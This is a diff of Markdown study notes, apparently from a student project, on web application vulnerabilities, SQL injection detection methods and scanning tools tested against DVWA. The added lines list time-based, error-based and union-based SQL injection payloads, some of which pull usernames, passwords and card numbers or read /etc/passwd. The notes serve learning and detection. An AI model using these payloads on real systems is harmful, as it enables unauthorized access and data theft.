@@ -14,7 +14,7 @@
 
 **Goal 2:** Overview of existing vulnerabilities in web applications
 
-**Goal 3:** main approaches and methods used for their detection
+**Goal 3:** Main approaches and methods used for their detection
 
 <br>
 
@@ -22,6 +22,9 @@
 
 **Exploitable:**
 - incorrect/insecure programming
+
+**Created a script to detect SQL injection vulnerabilities**
+- Could not gain unauthorized access or attacksystem
 
 
 <br>
@@ -35,7 +38,9 @@
 
 **Vulnerability Scanner Types:**
 - [Static scanners](#static-scanner)
+	Tend to produce higher number of false positives
 -  [Dynamic scanners](#dynamic-scanner)
+	Takes more time
 	
 
 
@@ -60,9 +65,7 @@
 <a id="equipment"></a>
 ## Equipment (ex: Raspberry Pi)  
 
-
-
-
+Damn Vulnerable Web Application (DVWA)
 
 <br>
 
@@ -82,14 +85,7 @@
 - [Dictionary](#dictionary-scheme)
 	- [Error-based](#error-based)
 	- [Union-based](#union-based)
-
-
-<br> 
-
-<a id="terminology"></a>
-## Terminology
-
-
+	- [Time-based](#time-based)
 
 <br>
 
@@ -126,6 +122,32 @@
 		
 <br>
 
+<a id="time-based"></a>
+**Time-Based (Dictionary Scheme Method):**
+
+	Definition: analyzing the time, it takes for the web application to process and respond to these queries
+	
+	Goal: determine the existence of a vulnerability in a web application by observing the delay in the response
+	
+	Provides: 
+
+	Example query:
+	
+	'OR SLEEP(5) --
+	'AND IF(1=1, SLEEP(5), NULL) –
+	'AND IF(1=1, (SELECT SLEEP(5)), NULL) --
+	'; SELECT CASE WHEN (1=1) THEN
+	pg_sleep(5) ELSE NULL END; --
+	'AND IF(1=1, SLEEP(5),
+	BENCHMARK(1000000,MD5(1))) --
+	'UNION ALL SELECT NULL, IF(1=1,
+	(SELECT SLEEP(5)), NULL) --
+	'UNION ALL SELECT NULL, IF(1=1,
+	SLEEP(5), BENCHMARK(1000000,MD5(1)))
+	--
+
+<br>
+
 <a id="error-based"></a>
 **Error-Based (Dictionary Scheme Method):**
 
@@ -134,6 +156,21 @@
 	Goal: trigger an error response from the database
 	
 	Provides: additional information that can be useful for further attacks or understanding the structure of the database. 
+
+	Example query: 
+	
+		'OR 1=1/0 --
+		'OR 'abc'='abc' AND 1=1/0 --
+		'; EXEC non_existent_procedure; --
+		'UNION ALL SELECT 1, @@VERSION –
+		'OR (SELECT COUNT(*) FROM
+		information_schema.tables) = 0 --
+		'OR ROW(1,1)>(SELECT
+		COUNT(*),CONCAT(CHAR(58,58,58),
+		version(), CHAR(58,58,58))x FROM
+		information_schema.tables GROUP BY x) --
+		'AND (SELECT TOP 1 column_name FROM
+		information_schema.columns) = 'username' -- 
 
 <br>
 
@@ -145,6 +182,20 @@
 	Goal: accessing unauthorized data or bypassing authentication mechanisms
 
 	Provides: additional information from the database
+	
+	Example Query:
+	
+		'UNION SELECT null --
+		'UNION SELECT column_name FROM
+		information_schema.columns --
+		' UNION SELECT username FROM users --
+		'UNION SELECT password FROM users
+		WHERE username='admin' --
+		'UNION SELECT credit_card_number FROM
+		customers --
+		'UNION SELECT NULL, CONCAT(username,
+		':', password) FROM users --
+		'UNION SELECT LOAD_FILE('/etc/passwd') --
 
 <br>
 
@@ -183,11 +234,17 @@
 		
 	Pros: 
 		- Customizable 
+		- user-friendly interface
+		- advanced detection algorithms
 		- Identify potential points of exploitation
 			- By: thoroughly analyzing app inputs and behaviors
 		- Exploitation features (can gain unauthorized access to database and manipulate data)
+		- Users don't need extensive knowledge of IS
+		- Supports: Error-Based, Time-Based, Boolean-Based, Union-Based, and Stacked Queries SQL injection techniques
+	
 	Cons:
 		- Only supports MySQL/MariaDB
+		- May not support cookie handling (when authentication is required)
 	
 	Additional Notes:
 		- Modules provided can be imported into other Python-based scripts, allowing users to create their own scripts for specific penetration testing tasks
@@ -205,13 +262,20 @@
 		
 	Pros: 
 		- Open-source 
+		- User-friendly graphical interface
 		- Automate injection attacks and exploits
+		- Doesn't require additional IS knowledge
+		- Supports: Error-Based, Time-Based, and Blind-Based scans
 		- Features:
 			- Automated Enumeration and Cloning Attacks
 			- Scanning Subnets and IP Lists
 			- Password Cracking
 			- JavaScript Injection Techniques
 			- Timing-Based Attacks
+	
+	Cons: 
+	- lacks settings beyond choosing available scan type and vulnerable payload
+	- Doesn't support use of cookies
 	
 	Additional Notes:
 		- Range of features to automate injection attacks and exploit default configuration weaknesses in databases.
